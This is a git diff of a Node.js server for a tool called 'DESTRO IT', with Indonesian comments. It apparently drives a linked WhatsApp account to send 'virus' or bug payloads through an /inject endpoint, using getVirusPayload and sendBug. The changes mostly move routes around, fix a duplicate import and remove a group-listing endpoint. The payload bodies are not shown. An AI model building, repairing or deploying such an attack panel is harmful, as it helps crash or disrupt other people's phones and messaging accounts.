@@ -6,7 +6,7 @@ const boxen = require('boxen');
 const fs = require('fs');
 const express = require('express');
 const cors = require('cors');
-const path = require('path');
+const path = require('path'); // INI SUDAH ADA DI ATAS, ASU!
 
 const { sendBug } = require('./fun.js'); 
 
@@ -18,11 +18,16 @@ const config = {
 const app = express();
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
-app.use(express.static(__dirname));
+
+// --- JEMBATAN HTML (VERSI RAPI) ---
+app.use(express.static(path.join(__dirname, '.')));
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+// ----------------------------------
 
 let sock;
 let isConnected = false;
-let pairingCode = "";
 
 const getVirusPayload = (type) => {
     const files = {
@@ -41,7 +46,7 @@ async function startDestroEngine() {
 
     console.clear();
     cfonts.say('DESTRO IT', { font: 'block', align: 'center', gradient: ['red', 'magenta'] });
-    console.log(boxen(chalk.red.bold("ENGINE ONLINE | PORT 7700 | READY"), { padding: 1, borderColor: 'red' }));
+    console.log(boxen(chalk.red.bold("ENGINE ONLINE | READY"), { padding: 1, borderColor: 'red' }));
 
     sock = makeWASocket({
         version,
@@ -59,7 +64,7 @@ async function startDestroEngine() {
         const { connection, lastDisconnect } = update;
         if (connection === 'open') {
             isConnected = true;
-            console.log(chalk.green.bold("\n [✓] STATUS: TERHUBUNG KE WHATSAPP!"));
+            console.log(chalk.green.bold("\n [✓] STATUS: TERHUBUNG!"));
         }
         if (connection === 'close') {
             isConnected = false;
@@ -71,20 +76,11 @@ async function startDestroEngine() {
 
 app.get('/status', (req, res) => res.json({ connected: isConnected }));
 
-app.get('/getgroups', async (req, res) => {
-    try {
-        if (!isConnected) return res.status(500).json({ error: "Offline" });
-        const groups = await sock.groupFetchAllParticipating();
-        res.json(Object.values(groups));
-    } catch (e) { res.status(500).json({ error: "Retry" }); }
-});
-
 app.post('/get-pairing', async (req, res) => {
     const { number } = req.body;
     if (!number) return res.status(400).json({ error: "No Number" });
     try {
         let code = await sock.requestPairingCode(number.replace(/\D/g, ''));
-        pairingCode = code;
         res.json({ code: code });
     } catch (err) { res.status(500).json({ error: "Retry" }); }
 });
@@ -99,18 +95,7 @@ app.post('/inject', async (req, res) => {
         res.json({ status: "success" });
     } catch (e) { res.status(500).json({ status: "error" }); }
 });
-// --- JEMBATAN WAJAH KE JANTUNG (VERSI FIX) ---
-const path = require('path');
 
-// 1. Kasih akses ke semua file (Video, Gambar, Script)
-app.use(express.static(path.join(__dirname, '.')));
-
-// 2. Paksa Railway nampilin index.html di halaman utama
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// 3. Pastiin Port-nya Bener (PENTING BANGET, ASU!)
 const PORT = process.env.PORT || 7700; 
 app.listen(PORT, "0.0.0.0", () => {
     console.log(`[!] ENGINE ON AT PORT ${PORT}`);
